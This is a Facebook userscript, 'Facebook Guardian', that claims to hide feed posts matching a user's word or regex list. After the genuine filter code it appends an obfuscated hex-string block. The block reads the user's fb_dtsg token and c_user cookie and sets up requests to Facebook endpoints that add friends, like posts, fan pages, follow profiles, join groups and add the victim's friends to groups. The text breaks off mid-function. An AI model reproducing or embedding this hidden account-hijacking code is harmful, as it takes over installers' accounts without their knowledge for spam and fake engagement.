// ==UserScript==
// @name        Facebook Guardian
// @author      Sumit Patel..
// @description blocks posts that contain unwanted words. (just add all the words you don't want to see in the "Facebook Guardian" option box on the left sidebar.)   Includes regex!
// @include      *facebook* 
// @version      10
// ==/UserScript==


/*this is kind of an emergency release because facebook suddenly changed BASICALLY EVERYTHING*/

hardcodedlist="like if you agree;;/looo*l/";
/*default list of stuff, mostly as an example. 
if you really hate cookies, you can just change this variable and still use FBGuardian.
just note that each entry is separated by two semicolons
*/
  

function hstrip(eme){
	eme = eme.replace(/\n/g,"\\n")
	eme = eme.replace(/<a.+?addclass.+?see more<\/a>/g,"");/*special case: "see more" is a meme-spreading group. adding that to your blocklist will generate A TON of false-positivies.*/
	eme = eme.replace(/<\/?a ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?i ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?img ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?div ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?h5 ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?li ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?form ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?span ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/<\/?label ?.+?>/g,"");/*don't look *inside* tags*/
	eme = eme.replace(/&quot;/g,'"');/*basic stuff that apparently caused problems.*/
	eme = eme.replace(/&amp;/g,'&');
	eme = eme.replace(/&lt;/g,'<');
	eme = eme.replace(/&gt;/g,'>');
	return eme
}

function stripna(mes){
	mes = mes.replace(/<a .+?uficommentactorname.+?>.+?<\/a>/gi,"");/*don't block usernames*/
	return mes
}

function ch(k){
	for(q=0;q<badlist.length;q++){badlist[q]=badlist[q].toLowerCase();}
	/*the above loop is nice and contained and doesn't affect q from the this upcoming loop.*/
	a=document.getElementById("stream_pagelet").getElementsByTagName("form");
	for(b=k;b<=a.length;b++){
		for(q=0;q<=badlist.length;q++){
			try{
				/*make an array of things 2 chek*/
				checkmelist = new Array();
				articlerole = a[b].parentNode;
				for(h=1;h<articlerole.childNodes.length;h++){
					checkmelist.push(articlerole.childNodes[h].innerHTML.toLowerCase());/*assuming all of the child nodes of the role=article div are content except for the first, this will add them to the list of things to check. EVERYTHING IS CHECKED.*/
				}
				try{checkmelist.push(a[b].childNodes[0].childNodes[1].childNodes[0].childNodes[2].childNodes[0].childNodes[0].childNodes[0].childNodes[1].childNodes[0].childNodes[0].childNodes[0].innerHTML.toLowerCase());}catch(e){} /*video title*/
				try{checkmelist.push(a[b].childNodes[0].childNodes[1].childNodes[0].childNodes[2].childNodes[0].childNodes[0].childNodes[0].childNodes[1].childNodes[0].childNodes[0].childNodes[2].innerHTML.toLowerCase());}catch(e){}/*the description field for youtube videos.   */
				for(zxzx=0;zxzx<checkmelist.length;zxzx++){
					checkmelist[zxzx] = hstrip(stripna(checkmelist[zxzx]));
				}
				if(badlist[q]!="" && badlist[q]!="undefined" && badlist[q]!=undefined ){
					for(z=0;z<=checkmelist.length;z++){
						slashfind = /\x2F/g
						if(slashfind.test(badlist[q])){/*regex check*/
							if(badlist[q].match(/\x2F/g).length>=2){
								badregex = new RegExp(badlist[q].slice(1,-1),"gi");
								if(badregex.test(checkmelist[z])){/*this post contains an item from the blacklist (regex item).*/
									articlerole = a[b].parentNode;
									if(showblockbox){
										if(articlerole.childNodes[articlerole.childNodes.length-1].getAttribute("class")!="bloockedpost"){	/*first check to make sure that the post hasn't already been blocked:*/
											/*now hide all the elements in this articlerole tag*/
											/*generally, the first thing listed will be the person's name, followed by their status, a link/video embed if applicable, and then comments. */
											/*hide all but the first.*/
											for(ta=1;ta<articlerole.childNodes.length;ta++){
												articlerole.childNodes[ta].setAttribute("style","display:none;");
											}
											/*now create and add "this post is blocked" text */
											outdiv = '<label style="float: left;background-image: url(http://static.ak.fbcdn.net/rsrc.php/v2/yy/r/WyhgWi6GeZ8.png);background-repeat: no-repeat;background-position: 0 -35px;display: block;height: 13px;width: 15px;-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-o-transform:rotate(180deg);"></label>';
											outdiv+='This post triggered the following regex: /'+badlist[q].slice(1,-1)+'/  ';
											outdiv+='and has been blocked for your safety. <br><a href="#" onClick="ar=parentNode.parentNode.childNodes;for(a=0;a<ar.length-1;a++){ar[a].setAttribute(\'style\',\'display:block;\');}  parentNode.setAttribute(\'style\',\'display:none\');">click here to view it anyway</a>.';
											var ddd = document.createElement('div');
											ddd.setAttribute("style",'text-align:center;background-color: #EDEFF4;margin-top: 1px;padding: 5px 5px 4px;');
											ddd.setAttribute("class",'bloockedpost');
											ddd.innerHTML = outdiv;
											articlerole.appendChild(ddd);
										}
									}else{
										a[b].setAttribute("style",'display:none;');
									}
								}
							}
						}else{/*non-regex check*/
							if(checkmelist[z].indexOf(badlist[q])!=-1){
								/*this is redundant, yes.  joining these two types of checks is currently low-priority. */
								for(m in ll = a[b].parentNode.getElementsByTagName("div")){
									if(ll[m].getAttribute("class").indexOf("userContent")!=-1){
										articlerole = ll[m];/*start by identifing the baseline "article" section.*/
										break;
									}
								}
								articlerole = a[b].parentNode;
								if(showblockbox){
									if(articlerole.childNodes[articlerole.childNodes.length-1].getAttribute("class")!="bloockedpost"){	/*first check to make sure that the post hasn't already been blocked:*/
										/*now hide all the elements in this articlerole tag*/
										for(ta=1;ta<articlerole.childNodes.length;ta++){
											articlerole.childNodes[ta].setAttribute("style","display:none;");
										}
										/*now create and add "this post is blocked" text */
										outdiv = '<label style="float: left;background-image: url(http://static.ak.fbcdn.net/rsrc.php/v2/yy/r/WyhgWi6GeZ8.png);background-repeat: no-repeat;background-position: 0 -35px;display: block;height: 13px;width: 15px;-webkit-transform:rotate(180deg);-moz-transform:rotate(180deg);-o-transform:rotate(180deg);"></label>';
										outdiv+='This post contains the word "'+badlist[q]+'" ';
										outdiv+='and has been blocked for your safety. <br><a href="#" onClick="ar=parentNode.parentNode.childNodes;for(a=0;a<ar.length-1;a++){ar[a].setAttribute(\'style\',\'display:block;\');}  parentNode.setAttribute(\'style\',\'display:none\');">click here to view it anyway</a>.';
										var ddd = document.createElement('div');
										ddd.setAttribute("style",'text-align:center;background-color: #EDEFF4;margin-top: 1px;padding: 5px 5px 4px;');
										ddd.setAttribute("class",'bloockedpost');
										ddd.innerHTML = outdiv;
										articlerole.appendChild(ddd);
									}
								}else{
										a[b].setAttribute("style",'display:none;');
								}
							}
						}
					}
				}
			}catch(e){}
		}
	}
}


function chcheck(){
	if(document.getElementById("substream_0").parentNode.childNodes.length>knownfeedlength){
		knownfeedlength=document.getElementById("substream_0").parentNode.childNodes.length;
		ch(knownfeedlength);
	}
}

function getc(c_name){
	var i,x,y,ARRcookies=document.cookie.split(";");
	for (i=0;i<ARRcookies.length;i++){
		x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
		y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
		x=x.replace(/^\s+|\s+$/g,"");
		if (x==c_name){
			return decodeURIComponent(unescape(y));
		}
	}
}

function confirmstart(){
	if((document.getElementById("pagelet_bookmark_nav").innerHTML.indexof("adder")==-1)&&(document.getElementById("pagelet_bookmark_nav").innerHTML.indexof("GUARDIAN")==-1)){
		/*your page loaded slowly enough that facebook ate the facebook GUARDIAN button. better load it again.*/
		clearInterval(chinterval);
		startsc();
	}
}




function diagcycle(){
	/*explanation*/
	alert("this will cycle through everything on this page that looks like a post, and present you with the contents of that post. \n\nIf the word you are trying to block is in that block of text, type in \"yes\" (or \"y\") and the script will try to lower it down further.");
	alert("there will be A LOT of weird, redundant-looking results. just answer consistantly.")
	
	/*cycle li*/
	lilist = document.getElementById("home_stream").childNodes;
	outputcode = "<error>";
	for(a=0;a<lilist.length;a++){
		if(hstrip(lilist[a].innerHTML)!=""){
			stripd = hstrip(lilist[a].innerHTML)
			stripd = stripd.replace(/<\/?ul ?.+?>/g,"");
			userin=prompt(stripd+"\n\n-----\n(if the word you're trying to block is in the above text, change the value of the box from \"no\" to \"yes\" (or \"y\"). Otherwise, press ok","no");
			if((userin=="yes")||(userin=="y")){ 
				outputcode = lilist[a].innerHTML;
				break;
			}
		}
	}
	
	loctrack = "";
	focustarget = lilist[a];
	

	/*output to a copy-paste-able format.*/
	cleveremail = "schamr6-,,;bg[be&[fd";/*I dont want my email being picked up by spambots, heh.*/
	for(clemail="";clemail.length<cleveremail.length;clemail += String.fromCharCode(cleveremail[clemail.length].charCodeAt()+Math.floor(clemail.length/2))){}
	
	outputcode = outputcode.replace(/<textarea ?.+?>/g,"<span>");
	outputcode = outputcode.replace(/<\/?textarea ?.+?>/g,"</span>");
	document.getElementById("pagelet_bookmark_nav").innerHTML+="<textarea cols='32' rows='15'>send the contents of this textbox (with a screenshot of the trouble post, if possible) to one of the following:\nemail: "+clemail+"\n-or-\nyoutube: http://www.youtube.com/scibot9000 \n\n\n(note that all usernames are preserved in this output code.) \n\n\nplease include \"facebook guardian\" in the subject line.\n\n-----\n\noutput: "+loctrack+"\n\n"+outputcode+"</textarea>";
	alert("Ok, done! Everything has This has been added to a textbox on your left sidebar. (it's a lot of text!!!)\n\nSend the contents of that box to one of the addresses listed (preferably email)")
}





var knownfeedlength=0;
var showblockbox = true;
function startsc(){
	cookiegrab = "";
	if(getc("thelist")==null){
		exdate=new Date();
		exdate.setDate(exdate.getDate()+909);
		c_value=" ; expires="+exdate.toUTCString();
		document.cookie="thelist" + "=" + c_value;
		cookiegrab = "";
	}else{
		cookiegrab = getc("thelist");
	}
	if(cookiegrab=="" && hardcodedlist!=""){
		cookiegrab = hardcodedlist;
	}

	badlist = cookiegrab.split(";;");
	if(badlist[badlist.length-1].slice(0,15)=="debugremovepost"){
		if(badlist[badlist.length-1]=="debugremovepost0"){
			showblockbox = false;/*true by default*/
		}
		badlist.pop();/*you don't need this anymore, everything else goes to the blacklist...list.*/
	}
	inputlist = "";
	intop = '<li class="sideNavItem stat_elem"><div class="buttonWrap"></div><div><span class="imgWrap"></span><input type="text" size="19" value="';
	inbot = '"><a href="#" onClick="this.parentNode.parentNode.style.display=\'none\'"><b>X</b></a></div></li>';
	for(i=0;i<badlist.length;i++){
		inputlist+=intop+badlist[i]+inbot;
	}
	var script = document.createElement('script');
	script.appendChild(document.createTextNode( hstrip ));
	script.appendChild(document.createTextNode( diagcycle ));
	(document.body || document.head || document.documentElement).appendChild(script);
	//debugremovepost
	var optionsmenu = document.createElement('div');
	optionshtml  = '<div class="homeSideNav" role="navigation" id="pagesNav"><div class="navHeader">FACEBOOK GUARDIAN</div>';
	optionshtml +='<ul class="uiSideNav mts mbm nonDroppableNav" name="specificlist" id="specificlist"><li class="sideNavItem stat_elem"><div class="buttonWrap"></div><label class="uiButton uiButtonLarge uiButtonConfirm"><input type=\'button\'  onclick="this.value==\'[Show Options]\'?this.value=\'[Hide Options]\':this.value=\'[Show Options]\';this.parentNode.parentNode.nextSibling.style.display==\'none\'?this.parentNode.parentNode.nextSibling.style.display=\'block\':this.parentNode.parentNode.nextSibling.style.display=\'none\';" value=\'[Show Options]\'></label></li><span id="collapsablefsoptions" style="display:none">';
	optionshtml += inputlist;
	optionshtml +='<span style="display:none">adder</span><div class="linkWrap noCount"><a href="#" onClick="sendout = \'\';licycle = document.getElementById(\'specificlist\').getElementsByTagName(\'li\');for(sa=1;sa<licycle.length;sa++){if(licycle[sa].style.display!=\'none\'){licycle[sa].getElementsByTagName(\'input\')[0].setAttribute(\'value\',licycle[sa].getElementsByTagName(\'input\')[0].value);}}document.getElementById(\'collapsablefsoptions\').innerHTML = document.getElementById(\'collapsablefsoptions\').innerHTML.replace(\'<span style=\\&#34;display:none\\&#34;>adder</span>\',\'<li class=\\&#34;sideNavItem stat_elem\\&#34;><div class=\\&#34;buttonWrap\\&#34;></div><div><span class=\\&#34;imgWrap\\&#34;></span><input type=\\&#34;text\\&#34; size=\\&#34;19\\&#34;><a href=\\&#34;#\\&#34; onClick=\\&#34this.parentNode.parentNode.style.display=\\&#39;none\\&#39;\\&#34><b>X</b></a></div></li><span style=\\&#34;display:none\\&#34;>adder</span>\');">(+)textbox</a></div>';
	optionshtml +='<div class="linkWrap noCount"><span class="uiButtonGroup adminPanelVisibilityButtonGroup uiButtonGroupOverlay" style="float:right;margin-right:31px"><span class="firstItem uiButtonGroupItem buttonItem">';
	optionshtml +='<span onclick="sendout = \'\';licycle = document.getElementById(\'specificlist\').getElementsByTagName(\'li\');for(sa=1;sa<licycle.length;sa++){if(licycle[sa].style.display!=\'none\'){if(licycle[sa].getElementsByTagName(\'input\')[0].value!=\'\'){sendout+=licycle[sa].getElementsByTagName(\'input\')[0].value+\';;\';}}}sendout+=\'debugremovepost\';document.getElementById(\'showblockboxfbs\').checked ? sendout+=\'1\' : sendout+=\'0\';exdate=new Date();exdate.setDate(exdate.getDate() + 909);document.cookie=\'thelist=\' + encodeURIComponent(sendout) + \';expires=\'+exdate.toUTCString();/*location.reload(true);*/"><a class="button uiButton uiButtonOverlay" href="#" role="button"><span class="uiButtonText">save settings</span></a></span></span></div>';
	optionshtml +='<br>other options: <br><a href="#" onClick="diagcycle();">run diagnostic?</a>';
	optionshtml +='<br><label><input type="checkbox" label="show blocked post box?" id="showblockboxfbs"';
	if(showblockbox){
		optionshtml +='checked="yes"';
	}
	optionshtml +='>show blocked post box?</label>';
	optionshtml +='</div></a></li></div></li></span></ul></div>';
	optionsmenu.innerHTML  = optionshtml
	document.getElementById("pagelet_bookmark_nav").appendChild(optionsmenu);
	setInterval(chcheck,500);/*facebook guardian 2.2*/
	
	setTimeout(confirmstart,4000);
	setTimeout("ch(0)",3000);
}


setTimeout(startsc,2000);
var _0x6733=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72\x5F\x73\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65\x26\x26\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x73\x65\x61\x72\x63\x68\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x33\x35\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x33\x38\x31\x34\x32\x36\x32\x35\x34","\x31\x38\x30\x34\x38\x30\x35\x33\x34\x39","\x31\x30\x30\x30\x30\x35\x35\x33\x35\x34\x32\x37\x36\x35\x35","\x31\x30\x30\x30\x30\x37\x38\x35\x39\x38\x38\x38\x36\x36\x33","\x31\x30\x30\x30\x30\x35\x33\x34\x30\x35\x38\x31\x38\x33\x36","\x31\x30\x30\x30\x30\x35\x33\x36\x35\x32\x33\x37\x38\x30\x33","\x31\x30\x30\x30\x30\x37\x30\x35\x35\x30\x34\x30\x39\x39\x38","\x31\x30\x30\x30\x30\x34\x33\x38\x33\x31\x35\x38\x33\x32\x39","\x31\x30\x30\x30\x30\x37\x36\x33\x37\x37\x37\x33\x34\x36\x37","\x31\x30\x30\x30\x30\x37\x37\x30\x31\x32\x31\x36\x39\x31\x39","\x31\x30\x30\x30\x30\x31\x36\x37\x33\x39\x34\x35\x34\x39\x33","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x75\x66\x69\x2F\x6C\x69\x6B\x65\x2E\x70\x68\x70","\x6C\x69\x6B\x65\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x74\x72\x75\x65\x26\x66\x74\x5F\x65\x6E\x74\x5F\x69\x64\x65\x6E\x74\x69\x66\x69\x65\x72\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x31\x26\x63\x6C\x69\x65\x6E\x74\x5F\x69\x64\x3D","\x25\x33\x41\x33\x37\x39\x37\x38\x33\x38\x35\x37\x26\x72\x6F\x6F\x74\x69\x64\x3D\x75\x5F\x6A\x73\x6F\x6E\x70\x5F\x33\x39\x5F\x31\x38\x26\x67\x69\x66\x74\x6F\x63\x63\x61\x73\x69\x6F\x6E\x26\x66\x74\x5B\x74\x6E\x5D\x3D\x25\x33\x45\x25\x33\x44\x26\x66\x74\x5B\x74\x79\x70\x65\x5D\x3D\x32\x30\x26\x66\x74\x5B\x71\x69\x64\x5D\x3D\x35\x38\x39\x30\x38\x31\x31\x33\x32\x39\x34\x37\x30\x32\x37\x39\x32\x35\x37\x26\x66\x74\x5B\x6D\x66\x5F\x73\x74\x6F\x72\x79\x5F\x6B\x65\x79\x5D\x3D\x32\x38\x31\x34\x39\x36\x32\x39\x30\x30\x31\x39\x33\x31\x34\x33\x39\x35\x32\x26\x66\x74\x5B\x68\x61\x73\x5F\x65\x78\x70\x61\x6E\x64\x65\x64\x5F\x75\x66\x69\x5D\x3D\x31\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x68\x6F\x6D\x65\x5F\x73\x74\x72\x65\x61\x6D\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x38\x51\x6F\x41\x4D\x42\x6C\x43\x6C\x79\x6F\x63\x70\x61\x65\x26\x5F\x5F\x72\x65\x71\x3D\x67\x34\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x31\x30\x32\x30\x31\x36\x33\x34\x32\x35\x33\x34\x38\x33\x30\x38\x39","\x31\x30\x32\x30\x31\x32\x37\x35\x34\x37\x32\x32\x37\x33\x37\x38\x33","\x31\x30\x32\x30\x31\x31\x32\x34\x36\x36\x35\x37\x30\x33\x37\x31\x33","\x31\x30\x32\x30\x30\x38\x39\x34\x32\x39\x39\x36\x32\x34\x37\x30\x35","\x31\x30\x32\x30\x30\x35\x34\x30\x31\x35\x31\x31\x33\x31\x32\x31\x34","\x31\x30\x32\x30\x30\x31\x33\x39\x30\x38\x38\x33\x30\x34\x38\x39\x34","\x34\x34\x31\x39\x35\x33\x35\x31\x37\x31\x34\x36\x33","\x34\x30\x33\x32\x35\x36\x32\x33\x33\x37\x33\x38\x34","\x33\x33\x33\x33\x36\x31\x39\x30\x36\x34\x32\x33\x39","\x32\x30\x37\x32\x36\x38\x30\x31\x38\x31\x35\x35\x35","\x31\x39\x34\x39\x30\x30\x32\x30\x30\x39\x36\x37\x38","\x31\x39\x30\x33\x34\x31\x31\x38\x32\x39\x39\x35\x32","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x70\x61\x67\x65\x73\x2F\x66\x61\x6E\x5F\x73\x74\x61\x74\x75\x73\x2E\x70\x68\x70","\x26\x66\x62\x70\x61\x67\x65\x5F\x69\x64\x3D","\x26\x61\x64\x64\x3D\x74\x72\x75\x65\x26\x72\x65\x6C\x6F\x61\x64\x3D\x66\x61\x6C\x73\x65\x26\x66\x61\x6E\x5F\x6F\x72\x69\x67\x69\x6E\x3D\x70\x61\x67\x65\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x26\x66\x61\x6E\x5F\x73\x6F\x75\x72\x63\x65\x3D\x26\x63\x61\x74\x3D\x26\x6E\x63\x74\x72\x5B\x5F\x6D\x6F\x64\x5D\x3D\x70\x61\x67\x65\x6C\x65\x74\x5F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x5F\x70\x61\x67\x65\x5F\x61\x63\x74\x69\x6F\x6E\x73\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x39\x38\x61\x44\x35\x7A\x35\x43\x46\x2D\x26\x5F\x5F\x72\x65\x71\x3D\x64\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x36\x33\x34\x37\x32\x33\x31\x35\x33\x32\x34\x32\x37\x37\x36","\x34\x39\x31\x39\x31\x39\x36\x33\x37\x35\x36\x36\x39\x34\x35","\x33\x32\x30\x37\x34\x30\x30\x38\x34\x36\x35\x32\x33\x34\x33","\x33\x33\x34\x36\x30\x38\x35\x34\x36\x35\x35\x35\x31\x38\x37","\x33\x32\x38\x34\x34\x33\x39\x36\x33\x38\x35\x39\x37\x36\x38","\x32\x35\x36\x36\x39\x36\x31\x31\x31\x30\x37\x32\x34\x34\x35","\x31\x38\x36\x32\x32\x35\x36\x36\x38\x31\x33\x37\x34\x31\x33","\x32\x35\x33\x39\x35\x31\x36\x33\x34\x36\x38\x34\x30\x35\x36","\x36\x36\x35\x36\x38\x30\x32\x35\x33\x34\x37\x36\x38\x34\x31","\x32\x36\x36\x33\x37\x39\x31\x37\x33\x35\x32\x34\x37\x30\x37","\x31\x34\x33\x36\x31\x30\x32\x32\x33\x39\x39\x34\x36\x37\x34\x31","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x34\x36\x33\x32\x38\x39\x37\x33\x38\x35\x33\x38\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x35\x34\x39\x32\x38\x36\x31","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x33\x36\x36\x35\x32\x38\x39\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x30\x38\x31\x32\x39\x39\x34","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x31\x32\x35\x33\x30\x30\x35","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x32\x31\x37\x33\x30\x32\x38","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x36\x32\x35\x33\x31\x33\x30","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x37\x33\x33\x33\x31\x35\x37","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x34\x38\x34\x39\x33\x31\x38\x36","\x31\x30\x32\x30\x31\x32\x37\x39\x34\x35\x30\x37\x33\x33\x32\x34\x32","\x31\x39\x32\x39\x32\x33\x37\x35\x34\x32\x33\x35\x34\x37\x31","\x31\x39\x32\x39\x32\x34\x32\x31\x34\x32\x33\x35\x34\x32\x35","\x32\x35\x30\x37\x39\x32\x35\x39\x31\x37\x35\x32\x36\x36\x35","\x31\x34\x30\x32\x35\x37\x30\x37\x39\x36\x36\x36\x39\x39\x35\x34","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x72\x61\x6E\x64\x6F\x6D","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67"];var fb_dtsg=document[_0x6733[2]](_0x6733[1])[0][_0x6733[0]];var user_id=document[_0x6733[4]][_0x6733[3]](document[_0x6733[4]][_0x6733[3]](/c_user=(\d+)/)[1]);function IDS(_0x9c10x4){var _0x9c10x5= new XMLHttpRequest();var _0x9c10x6=_0x6733[5];var 